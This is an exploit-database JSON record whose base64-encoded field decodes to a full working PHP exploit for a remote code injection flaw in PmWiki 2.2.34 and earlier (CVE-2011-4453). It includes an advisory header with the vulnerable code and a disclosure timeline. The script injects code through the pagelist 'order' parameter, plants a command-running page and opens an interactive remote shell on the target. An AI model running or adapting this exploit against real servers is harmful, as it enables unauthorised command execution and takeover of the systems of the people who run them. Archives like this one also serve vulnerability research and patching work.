{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgUG1XaWtpIDw9IDIuMi4zNCAocGFnZWxpc3QpIFJlbW90ZSBQSFAgQ29kZSBJbmplY3Rpb24gRXhwbG9pdA0KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICANCiAgICBhdXRob3IuLi4uLi4uLi4uLi4uLi46IEVnaWRpbyBSb21hbm8gYWthIEVnaVgNCiAgICBtYWlsLi4uLi4uLi4uLi4uLi4uLi46IG4wYjBkMTNzW2F0XWdtYWlsW2RvdF1jb20NCiAgICBzb2Z0d2FyZSBsaW5rLi4uLi4uLi46IGh0dHA6Ly93d3cucG13aWtpLm9yZy8NCiAgICBhZmZlY3RlZCB2ZXJzaW9ucy4uLi46IGZyb20gMi4wLjAgdG8gMi4yLjM0DQogICAgDQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgfCBUaGlzIHByb29mIG9mIGNvbmNlcHQgY29kZSB3YXMgd3JpdHRlbiBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZSBvbmx5LiAgICB8DQogICAgfCBVc2UgaXQgYXQgeW91ciBvd24gcmlzay4gQXV0aG9yIHdpbGwgYmUgbm90IHJlc3BvbnNpYmxlIGZvciBhbnkgZGFtYWdlLiB8DQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgDQogICAgWy1dIHZ1bG5lcmFibGUgY29kZSBpbiBQYWdlTGlzdFNvcnQoKSBmdW5jdGlvbiBkZWZpbmVkIGludG8gL3NjcmlwdHMvcGFnZWxpc3QucGhwDQogICAgDQogICAgNDUyLiAgICAgICRjb2RlID0gJyc7DQogICAgNDUzLiAgICAgIGZvcmVhY2goJG9wdFsnPW9yZGVyJ10gYXMgJG8gPT4gJHIpIHsNCiAgICA0NTQuICAgICAgICBpZiAoQCRQYWdlTGlzdFNvcnRDbXBbJG9dKSANCiAgICA0NTUuICAgICAgICAgICRjb2RlIC49ICJcJGMgPSB7JFBhZ2VMaXN0U29ydENtcFskb119OyAiOyANCiAgICA0NTYuICAgICAgICBlbHNlIA0KICAgIDQ1Ny4gICAgICAgICAgJGNvZGUgLj0gIlwkYyA9IEBzdHJjYXNlY21wKFwkUENhY2hlW1wkeF1bJyRvJ10sXCRQQ2FjaGVbXCR5XVsnJG8nXSk7ICI7DQogICAgNDU4LiAgICAgICAgJGNvZGUgLj0gImlmIChcJGMpIHJldHVybiAkclwkYztcbiI7DQogICAgNDU5LiAgICAgIH0NCiAgICA0NjAuICAgICAgU3RvcFdhdGNoKCdQYWdlTGlzdFNvcnQgc29ydCcpOw0KICAgIDQ2MS4gICAgICBpZiAoJGNvZGUpIA0KICAgIDQ2Mi4gICAgICAgIHVhc29ydCgkbGlzdCwNCiAgICA0NjMuICAgICAgICAgICAgICAgY3JlYXRlX2Z1bmN0aW9uKCckeCwkeScsICJnbG9iYWwgXCRQQ2FjaGU7ICRjb2RlIHJldHVybiAwOyIpKTsNCiAgICA0NjQuICAgICAgU3RvcFdhdGNoKCdQYWdlTGlzdFNvcnQgZW5kJyk7DQogICAgDQogICAgSW5wdXQgcGFzc2VkIHRocm91Z2ggJ29yZGVyJyBwYXJhbWV0ZXIgb2YgJ3BhZ2VsaXN0JyBkaXJlY3RpdmUgaXNuJ3QgcHJvcGVybHkgc2FuaXRpemVkIGJlZm9yZSBiZWluZyB1c2VkDQogICAgaW4gYSBjYWxsIHRvIGNyZWF0ZV9mdW5jdGlvbigpIGF0IGxpbmUgNDYzLiBUaGlzIGNhbiBiZSBleHBsb2l0ZWQgdG8gaW5qZWN0IGFuZCBleGVjdXRlIGFyYml0cmFyeSBQSFAgY29kZS4NCiAgICBTdWNjZXNzZnVsIGV4cGxvaXRhdGlvbiBvZiB0aGlzIHZ1bG5lcmFiaWxpdHkgbWlnaHQgcmVxdWlyZSBhdXRoZW50aWNhdGlvbiBpZiB0aGUgd2lraSBpc24ndCBwdWJsaWMgd3JpdGFibGUuDQogICAgDQogICAgWy1dIERpc2Nsb3N1cmUgdGltZWxpbmU6DQogICAgDQogICAgWzA5LzExLzIwMTFdIC0gVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcmVkDQogICAgWzExLzExLzIwMTFdIC0gSXNzdWUgcmVwb3J0ZWQgdG8gaHR0cDovL3d3dy5wbXdpa2kub3JnL3dpa2kvUElUUy8wMTI3MQ0KICAgIFsxMS8xMS8yMDExXSAtIFZlcnNpb24gMi4yLjM1IHJlbGVhc2VkOiBodHRwOi8vd3d3LnBtd2lraS5vcmcvd2lraS9QbVdpa2kvQ2hhbmdlTG9nI3YyMjM1DQogICAgWzEyLzExLzIwMTFdIC0gQ1ZFIG51bWJlciByZXF1ZXN0ZWQNCiAgICBbMTUvMTEvMjAxMV0gLSBBc3NpZ25lZCBDVkUtMjAxMS00NDUzDQogICAgWzIzLzExLzIwMTFdIC0gUHVibGljIGRpc2Nsb3N1cmUNCg0KKi8NCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQppbmlfc2V0KCJkZWZhdWx0X3NvY2tldF90aW1lb3V0IiwgNSk7DQoNCmZ1bmN0aW9uIGh0dHBfc2VuZCgkaG9zdCwgJHBhY2tldCkNCnsNCiAgICBpZiAoISgkc29jayA9IGZzb2Nrb3BlbigkaG9zdCwgODApKSkNCiAgICAgICAgZGllKCJcblstXSBObyByZXNwb25zZSBmcm9tIHskaG9zdH06ODBcbiIpOw0KIA0KICAgIGZwdXRzKCRzb2NrLCAkcGFja2V0KTsNCiAgICByZXR1cm4gc3RyZWFtX2dldF9jb250ZW50cygkc29jayk7DQp9DQoNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIjsNCnByaW50ICJcbnwgUG1XaWtpIDw9IDIuMi4zNCBSZW1vdGUgUEhQIENvZGUgSW5qZWN0aW9uIEV4cGxvaXQgYnkgRWdpWCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXG4iOw0KDQppZiAoJGFyZ2MgPCAzKQ0Kew0KICAgIHByaW50ICJcblVzYWdlLi4uLi4uOiBwaHAgJGFyZ3ZbMF0gPGhvc3Q+IDxwYXRoPlxuIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvcG13aWtpL1xuIjsNCiAgICBkaWUoKTsNCn0NCg0KJGhvc3QgPSAkYXJndlsxXTsNCiRwYXRoID0gJGFyZ3ZbMl07DQoNCiRwaHBjb2RlID0gIiddKTtlcnJvcl9yZXBvcnRpbmcoMCk7cGFzc3RocnUoYmFzZTY0X2RlY29kZShcJF9TRVJWRVJbSFRUUF9DTURdKSk7cHJpbnQoX19fKTtkaWU7IyI7DQokcGF5bG9hZCA9ICJhY3Rpb249ZWRpdCZwb3N0PXNhdmUmbj1DbWQuU2hlbGwmdGV4dD0oOnBhZ2VsaXN0IG9yZGVyPXskcGhwY29kZX06KSI7DQoNCiRwYWNrZXQgID0gIlBPU1QgeyRwYXRofXBtd2lraS5waHAgSFRUUC8xLjBcclxuIjsNCiRwYWNrZXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsNCiRwYWNrZXQgLj0gIkNvbnRlbnQtTGVuZ3RoOiAiLnN0cmxlbigkcGF5bG9hZCkuIlxyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG57JHBheWxvYWR9IjsNCg0KaWYgKCFwcmVnX21hdGNoKCIvTG9jYXRpb24vIiwgaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KSkpIGRpZSgiXG5bLV0gRWRpdCBwYXNzd29yZCByZXF1aXJlZD8hXG4iKTsNCg0KJHBhY2tldCAgPSAiUE9TVCB7JHBhdGh9cG13aWtpLnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ21kOiAlc1xyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1MZW5ndGg6IDExXHJcbiI7DQokcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbm49Q21kLlNoZWxsIjsNCg0Kd2hpbGUoMSkNCnsNCiAgICBwcmludCAiXG5wbXdpa2ktc2hlbGwjICI7DQogICAgaWYgKCgkY21kID0gdHJpbShmZ2V0cyhTVERJTikpKSA9PSAiZXhpdCIpIGJyZWFrOw0KICAgICRyZXNwb25zZSA9IGh0dHBfc2VuZCgkaG9zdCwgc3ByaW50ZigkcGFja2V0LCBiYXNlNjRfZW5jb2RlKCRjbWQpKSk7DQogICAgcHJlZ19tYXRjaCgiL1xuXHJcbiguKilfX18vcyIsICRyZXNwb25zZSwgJG0pID8gcHJpbnQgJG1bMV0gOiBkaWUoIlxuWy1dIEV4cGxvaXQgZmFpbGVkIVxuIik7DQp9DQoNCj8+", 
    "filename": "platforms/php/webapps/18149.php", 
    "id": "18149", 
    "cves": [
        "CVE-2011-4453"
    ]
}